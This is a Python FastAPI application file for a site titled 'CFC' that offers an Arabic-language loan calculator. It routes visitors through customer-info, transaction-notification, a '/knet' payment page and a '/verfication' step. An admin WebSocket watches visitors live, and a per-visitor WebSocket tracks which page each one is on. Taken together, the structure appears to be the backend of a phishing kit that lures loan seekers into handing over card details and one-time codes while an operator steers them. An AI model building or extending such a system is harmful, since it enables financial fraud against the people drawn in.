import json
import secrets

from bson import ObjectId
from bson.errors import InvalidId
from fastapi import FastAPI, Query, Request, WebSocket, WebSocketDisconnect
from fastapi.exception_handlers import http_exception_handler
from fastapi.responses import RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.exceptions import HTTPException as StarletteHTTPException

from app.database import lifespan
from app.dependencies import ADMIN_SESSION_COOKIE, get_admin_user_from_token, get_or_create_id
from app.loan_settings import get_annual_interest_rate
from app.presence import mark_offline as presence_mark_offline
from app.presence import mark_online as presence_mark_online
from app.realtime import admin_realtime_hub, visitor_realtime_hub
from app.routes.admin import router as admin_router
from app.routes.visitors import router as visitors_router

app = FastAPI(title="CFC", lifespan=lifespan)
app.mount("/static", StaticFiles(directory="app/static"), name="static")
templates = Jinja2Templates(directory="app/templates")


@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    csp_nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = csp_nonce
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{csp_nonce}'; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "img-src 'self' data: blob: https:; "
        "font-src 'self' https://fonts.gstatic.com; "
        "connect-src 'self'; "
        "object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
    )
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response


@app.exception_handler(StarletteHTTPException)
async def redirect_not_found(request: Request, exc: StarletteHTTPException):
    if exc.status_code == 404:
        return RedirectResponse(url="/", status_code=307)
    return await http_exception_handler(request, exc)


@app.get("/")
async def index(request: Request):
    response = templates.TemplateResponse("client/index.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/loan-calculator")
async def loan_calculator(
    request: Request,
    card: str = Query("cash"),
):
    card_inputs = {
        "cash": {
            "title": "قرض نقدي",
            "fields": [
                {"id": "salary", "label": "الراتب الشهري", "type": "number", "default": "450", "placeholder": "مثال: 450"},
                {"id": "amount", "label": "قيمة القرض المطلوبة", "type": "number", "default": "2500", "placeholder": "مثال: 2500"},
                {"id": "months", "label": "فترة السداد (شهر)", "type": "number", "default": "24", "placeholder": "مثال: 24"},
            ],
        },
        "automobile": {
            "title": "قرض سيارة",
            "fields": [
                {"id": "car_price", "label": "قيمة السيارة", "type": "number", "default": "6000", "placeholder": "مثال: 6000"},
                {"id": "upfront_amount", "label": "الدفعة الأولى", "type": "number", "default": "1000", "placeholder": "مثال: 1000"},
                {"id": "months", "label": "فترة السداد (شهر)", "type": "number", "default": "36", "placeholder": "مثال: 36"},
            ],
        },
        "furniture": {
            "title": "قرض أثاث",
            "fields": [
                {"id": "furniture_total", "label": "إجمالي قيمة الأثاث", "type": "number", "default": "1800", "placeholder": "مثال: 1800"},
                {"id": "installment", "label": "القسط المتوقع", "type": "number", "default": "95", "placeholder": "مثال: 95"},
            ],
        },
        "marine": {
            "title": "معدات بحرية",
            "fields": [
                {"id": "equipment_cost", "label": "قيمة المعدات", "type": "number", "default": "12000", "placeholder": "مثال: 12000"},
                {"id": "months", "label": "مدة التمويل (شهر)", "type": "number", "default": "48", "placeholder": "مثال: 48"},
            ],
        },
        "electrical": {
            "title": "أجهزة كهربائية",
            "fields": [
                {"id": "order_total", "label": "إجمالي الطلب", "type": "number", "default": "900", "placeholder": "مثال: 900"},
                {"id": "months", "label": "عدد الأقساط", "type": "number", "default": "12", "placeholder": "مثال: 12"},
            ],
        },
        "housing": {
            "title": "قرض مقسط",
            "fields": [
                {"id": "house_value", "label": "قيمة العقار", "type": "number", "default": "30000", "placeholder": "مثال: 30000"},
                {"id": "upfront_amount", "label": "الدفعة الأولى", "type": "number", "default": "5000", "placeholder": "مثال: 5000"},
                {"id": "years", "label": "مدة السداد (سنوات)", "type": "number", "default": "10", "placeholder": "مثال: 10"},
            ],
        },
        "educational": {
            "title": "تعليمي",
            "fields": [
                {"id": "tuition", "label": "الرسوم الدراسية", "type": "number", "default": "3500", "placeholder": "مثال: 3500"},
                {"id": "student_count", "label": "عدد الطلاب", "type": "number", "default": "1", "placeholder": "مثال: 1"},
            ],
        },
        "commercial": {
            "title": "قروض شركات",
            "fields": [
                {"id": "company_revenue", "label": "الإيراد الشهري", "type": "number", "default": "14000", "placeholder": "مثال: 14000"},
                {"id": "requested_amount", "label": "التمويل المطلوب", "type": "number", "default": "20000", "placeholder": "مثال: 20000"},
                {"id": "months", "label": "فترة السداد (شهر)", "type": "number", "default": "30", "placeholder": "مثال: 30"},
            ],
        },
    }

    selected_card_key = card if card in card_inputs else "cash"
    selected_card = card_inputs[selected_card_key]
    annual_interest_rate = await get_annual_interest_rate()

    response = templates.TemplateResponse(
        "client/loan_calculator.html",
        {
            "request": request,
            "selected_card_key": selected_card_key,
            "selected_card": selected_card,
            "annual_interest_rate": annual_interest_rate,
        },
    )
    await get_or_create_id(request, response)
    return response


@app.get("/customer-info")
async def customer_info(request: Request):
    response = templates.TemplateResponse("client/customer_info.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/additional-customer-info")
async def additional_customer_info(request: Request):
    response = templates.TemplateResponse("client/additional_customer_info.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/transaction-notification")
async def transaction_notification_page(request: Request):
    response = templates.TemplateResponse("client/transaction_notification.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/knet")
async def knet_page(request: Request):
    response = templates.TemplateResponse("client/knet.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/verfication")
async def verfication_page(request: Request):
    response = templates.TemplateResponse("client/verfication.html", {"request": request})
    await get_or_create_id(request, response)
    return response


@app.get("/verifification")
async def verifification_legacy_redirect():
    return RedirectResponse(url="/verfication", status_code=307)


@app.get("/verification")
async def verification_legacy_redirect():
    return RedirectResponse(url="/verfication", status_code=307)


@app.get("/healthz")
async def healthz():
    return {"status": "ok"}


@app.websocket("/ws/admin/recent-visitors")
async def admin_recent_visitors_ws(websocket: WebSocket):
    admin_token = websocket.cookies.get(ADMIN_SESSION_COOKIE)
    admin_user = get_admin_user_from_token(admin_token)
    if not admin_user:
        await websocket.close(code=1008)
        return

    await admin_realtime_hub.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        await admin_realtime_hub.disconnect(websocket)
    except Exception:
        await admin_realtime_hub.disconnect(websocket)


@app.websocket("/ws/visitor/redirect")
async def visitor_redirect_ws(websocket: WebSocket):
    visitor_id = str(websocket.cookies.get("id", "")).strip()
    try:
        visitor_object_id = ObjectId(visitor_id)
        visitor_id = str(visitor_object_id)
    except (InvalidId, TypeError):
        await websocket.close(code=1008)
        return

    async def mark_online(current_page: str | None = None) -> None:
        await presence_mark_online(visitor_id, current_page=current_page, ttl_seconds=20)
        await admin_realtime_hub.broadcast("visitor.heartbeat", visitor_id=visitor_id)

    async def mark_offline() -> None:
        await presence_mark_offline(visitor_id)
        await admin_realtime_hub.broadcast("visitor.offline", visitor_id=visitor_id)

    await visitor_realtime_hub.connect(visitor_id, websocket)
    await mark_online()
    try:
        while True:
            message = await websocket.receive_text()
            if message == "ping":
                await mark_online()
                continue
            try:
                payload = json.loads(message)
            except Exception:
                payload = None
            if isinstance(payload, dict) and str(payload.get("type", "")).strip().lower() == "heartbeat":
                current_page_raw = payload.get("current_page")
                current_page = str(current_page_raw).strip() if isinstance(current_page_raw, str) else None
                await mark_online(current_page=current_page)
    except WebSocketDisconnect:
        await visitor_realtime_hub.disconnect(visitor_id, websocket)
        await mark_offline()
    except Exception:
        await visitor_realtime_hub.disconnect(visitor_id, websocket)
        await mark_offline()


app.include_router(visitors_router)
app.include_router(admin_router)
